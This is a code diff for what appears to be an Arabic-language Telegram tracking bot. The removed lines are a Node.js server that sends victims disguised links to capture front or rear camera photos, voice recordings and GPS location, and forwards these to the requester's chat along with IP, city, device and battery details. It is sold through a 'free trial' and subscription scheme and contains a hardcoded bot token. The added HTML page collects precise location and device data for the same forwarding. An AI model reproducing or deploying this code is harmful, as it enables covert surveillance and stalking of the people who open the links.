@@ -1,302 +1,159 @@
-const TelegramBot = require('node-telegram-bot-api');
-const express = require('express');
-const bodyParser = require('body-parser');
-const multer = require('multer');
-const fs = require('fs');
-const path = require('path');
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديد الموقع</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        button {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        .loading {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button onclick="getLocation()">اضغط هنا لتحديد موقعك</button>
+        <div class="loading" id="loading" style="display: none;"></div>
+        <p class="result" id="userLocation"></p>
+    </div>
 
-const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
-const bot = new TelegramBot(botToken, { polling: true });
+    <form method="POST" action="/submitLocation" id="location-form">
+        <input type="hidden" name="latitude" id="latitude">
+        <input type="hidden" name="longitude" id="longitude">
+        <input type="hidden" name="chatId" id="chatId">
+        <input type="hidden" name="additionalData" id="additionalData">
+    </form>
 
-const app = express();
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(__dirname));
-
-const storage = multer.memoryStorage();
-const upload = multer({ storage: storage });
-const MAX_FREE_ATTEMPTS = 3;
-const userVisits = {};
-const freeTrialEndedMessage = 'لقد انتهت الفترة التجريبية المجانية. الرجاء شراء اشتراك من المطور لاستخدام البوت بدون قيود.';
-
-const adminId = '7130416076';
-const subscribedUsers = new Set();
-
-// مسار الكاميرا
-app.get('/camera/:userId', (req, res) => {
-    const userId = req.params.userId;
-    const cameraType = req.query.cameraType;
-
-    if (subscribedUsers.has(userId)) {
-        res.sendFile(path.join(__dirname, 'location.html'));
-        return;
-    }
-
-    if (!userVisits[userId]) {
-        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
-    }
-
-    userVisits[userId].camera++;
-
-    if (userVisits[userId].camera > MAX_FREE_ATTEMPTS) {
-        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
-        return;
-    }
-
-    res.sendFile(path.join(__dirname, 'location.html'));
-});
-
-// مسار تسجيل الصوت
-app.get('/record/:userId', (req, res) => {
-    const userId = req.params.userId;
-    const duration = req.query.duration;
-
-    if (subscribedUsers.has(userId)) {
-        res.sendFile(path.join(__dirname, 'record.html'));
-        return;
-    }
-
-    if (!userVisits[userId]) {
-        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
-    }
-
-    userVisits[userId].voiceRecord++;
-
-    if (userVisits[userId].voiceRecord > MAX_FREE_ATTEMPTS) {
-        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
-        return;
-    }
-
-    res.sendFile(path.join(__dirname, 'record.html'));
-});
-
-// مسار الحصول على الموقع
-app.get('/getLocation/:userId', (req, res) => {
-    const userId = req.params.userId;
-
-    if (subscribedUsers.has(userId)) {
-        res.sendFile(path.join(__dirname, 'SJGD.html'));
-        return;
-    }
-
-    if (!userVisits[userId]) {
-        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
-    }
-
-    userVisits[userId].getLocation++;
-
-    if (userVisits[userId].getLocation > MAX_FREE_ATTEMPTS) {
-        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
-        return;
-    }
-
-    res.sendFile(path.join(__dirname, 'SJGD.html'));
-});
-
-// استلام الصور
-app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
-    const chatId = req.body.userId;
-    const files = req.files;
-    const additionalData = JSON.parse(req.body.additionalData || '{}');
-    const cameraType = req.body.cameraType;
-
-    if (files && files.length > 0) {
-        console.log(`Received ${files.length} images from user ${chatId}`);
-
-        const caption = `
-معلومات إضافية:
-نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
-IP: ${additionalData.ip}
-الدولة: ${additionalData.country}
-المدينة: ${additionalData.city}
-المنصة: ${additionalData.platform}
-إصدار الجهاز: ${additionalData.deviceVersion}
-مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
-الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
-        `;
-
-        try {
-            for (const file of files) {
-                await bot.sendPhoto(chatId, file.buffer, { caption });
+    <script>
+        async function getLocation() {
+            document.getElementById("loading").style.display = "block";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, handleError, { enableHighAccuracy: true });
+            } else {
+                alert("متصفحك لا يدعم تحديد الموقع.");
+                document.getElementById("loading").style.display = "none";
             }
-            console.log('Photos sent successfully');
-            res.json({ success: true });
-        } catch (err) {
-            console.error('Failed to send photos:', err);
-            res.status(500).json({ error: 'Failed to send photos' });
         }
-    } else {
-        console.log('No images received');
-        res.status(400).json({ error: 'No images received' });
-    }
-});
 
-// استلام الصوت
-app.post('/submitVoice', upload.single('voice'), (req, res) => {
-    const chatId = req.body.chatId;
-    const voiceFile = req.file;
-    const additionalData = JSON.parse(req.body.additionalData || '{}');
+        async function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const chatId = getParameterByName('chatId');  // احصل على chatId من الـ URL
 
-    if (!voiceFile) {
-        console.error('No voice file received');
-        return res.status(400).json({ error: 'No voice file received' });
-    }
+            if (!chatId) {
+                alert("لم يتم استلام معرف الدردشة (chatId).");
+                document.getElementById("loading").style.display = "none";
+                return;
+            }
 
-    const caption = `
-معلومات إضافية:
-IP: ${additionalData.ip}
-الدولة: ${additionalData.country}
-المدينة: ${additionalData.city}
-المنصة: ${additionalData.platform}
-إصدار الجهاز: ${additionalData.deviceVersion}
-مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
-الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
-    `;
+            const additionalData = await collectAdditionalData();
 
-    bot.sendVoice(chatId, voiceFile.buffer, { caption })
-        .then(() => {
-            console.log('Voice sent successfully');
-            res.json({ success: true });
-        })
-        .catch(error => {
-            console.error('Error sending voice:', error);
-            res.status(500).json({ error: 'Failed to send voice message' });
-        });
-});
+            document.getElementById("latitude").value = latitude;
+            document.getElementById("longitude").value = longitude;
+            document.getElementById("chatId").value = chatId;
+            document.getElementById("additionalData").value = JSON.stringify(additionalData);
 
-// استلام الموقع
-app.post('/submitLocation', upload.none(), async (req, res) => {
-    const chatId = req.body.chatId;
-    const latitude = req.body.latitude;
-    const longitude = req.body.longitude;
-    const additionalData = JSON.parse(req.body.additionalData || '{}');
-
-    console.log('Received data:', { chatId, latitude, longitude, additionalData });
-
-    if (!latitude || !longitude) {
-        console.error('No location data received');
-        return res.status(400).json({ error: 'No location data received' });
-    }
-
-    const caption = `
-    معلومات إضافية:
-    IP: ${additionalData.ip}
-    الدولة: ${additionalData.country}
-    المدينة: ${additionalData.city}
-    المنصة: ${additionalData.platform}
-    إصدار الجهاز: ${additionalData.deviceVersion}
-    مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
-    الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
-    `;
-
-    console.log('Prepared caption:', caption);
-
-    try {
-        console.log('Attempting to send location...');
-        await bot.sendLocation(chatId, latitude, longitude);
-        console.log('Location sent successfully, attempting to send message...');
-        await bot.sendMessage(chatId, caption);
-        console.log('Message sent successfully');
-        res.json({ success: true });
-    } catch (error) {
-        console.error('Error sending location or message:', error);
-        res.status(500).json({ error: 'Failed to send location message' });
-    }
-});
-
-
-// أوامر البوت
-bot.onText(/\/subscribe (\d+)/, (msg, match) => {
-    if (msg.from.id.toString() !== adminId) {
-        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
-        return;
-    }
-
-    const userId = match[1];
-    if (subscribedUsers.add(userId)) {
-        bot.sendMessage(msg.chat.id, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
-    } else {
-        bot.sendMessage(msg.chat.id, `المستخدم ${userId} موجود بالفعل في قائمة المشتركين.`);
-    }
-});
-
-bot.onText(/\/unsubscribe (\d+)/, (msg, match) => {
-    if (msg.from.id.toString() !== adminId) {
-        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
-        return;
-    }
-
-    const userId = match[1];
-    if (subscribedUsers.delete(userId)) {
-        bot.sendMessage(msg.chat.id, `تمت إزالة المستخدم ${userId} من قائمة المشتركين.`);
-    } else {
-        bot.sendMessage(msg.chat.id, `المستخدم ${userId} غير موجود في قائمة المشتركين.`);
-    }
-});
-
-bot.onText(/\/listsubscribers/, (msg) => {
-    if (msg.from.id.toString() !== adminId) {
-        bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
-        return;
-    }
-
-    const subscribersList = Array.from(subscribedUsers).join('\n');
-    bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
-});
-
-bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    const message = 'مرحبًا! اختر إحدى الخيارات التالية:';
-    bot.sendMessage(chatId, message, {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: 'تصوير كام أمامي', callback_data:'front_camera' }],
-                [{ text: 'تصوير كام خلفي', callback_data:'rear_camera' }],
-                [{ text: 'تسجيل صوت', callback_data:'voice_record' }],
-                [{ text: 'الحصول على الموقع', callback_data:'get_location' }]
-            ]
+            document.getElementById("location-form").submit();
         }
-    });
-});
 
-bot.on('callback_query', (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-
-    if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://creative-marmalade-periwinkle.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
-        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
-    } else if (data === 'voice_record') {
-        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
-    if (data === 'get_location') {
-        const url = `https://creative-marmalade-periwinkle.glitch.me/getLocation/${chatId}`;
-        console.log('Data received:', data);
-        console.log('Chat ID:', chatId);
-        console.log('URL:', url);
-        
-        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`)
-            .then(() => console.log('Message sent successfully'))
-            .catch(err => console.error('Error sending message:', err));
-    }
-});
-
-bot.on('message', (msg) => {
-    const chatId = msg.chat.id;
-    const duration = parseInt(msg.text, 10);
-
-    if (!isNaN(duration)) {
-        if (duration > 0 && duration <= 20) {
-            const link = `https://creative-marmalade-periwinkle.glitch.me/record/${chatId}?duration=${duration}`;
-            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
-        } else {
-            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
+        function handleError(error) {
+            document.getElementById("loading").style.display = "none";
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("تم رفض طلب تحديد الموقع.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("معلومات الموقع غير متاحة.");
+                    break;
+                case error.TIMEOUT:
+                    alert("انتهت مهلة طلب تحديد الموقع.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("حدث خطأ غير معروف.");
+                    break;
+            }
         }
-    }
-});
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
-});
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
 
+        async function collectAdditionalData() {
+            const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+            const battery = await navigator.getBattery();
 
+            return {
+                ip: ipInfo.ip,
+                country: ipInfo.country_name,
+                city: ipInfo.city,
+                platform: getPlatformInfo().platform,
+                deviceVersion: getDeviceVersion(),
+                batteryLevel: battery.level,
+                batteryCharging: battery.charging,
+            };
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return { platform: "Windows" };
+            if (/Mac/.test(ua)) return { platform: "MacOS" };
+            if (/Linux/.test(ua)) return { platform: "Linux" };
+            if (/Android/.test(ua)) return { platform: "Android" };
+            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+            return { platform: "Unknown" };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+    </script>
+</body>
+</html>
